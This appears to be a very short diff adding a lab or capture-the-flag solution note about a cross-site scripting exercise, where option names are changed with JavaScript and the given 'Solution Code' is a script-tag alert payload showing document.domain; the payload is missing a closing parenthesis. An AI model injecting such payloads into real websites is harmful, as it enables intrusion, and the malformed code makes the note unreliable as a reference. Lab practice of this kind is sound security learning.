@@ -1,0 +1,3 @@
+Here, we are given options, and we are using JavaScript to change the names of these options and search for them.The result is successful.
+
+Solution Code= <script>alert(document.domain</script>
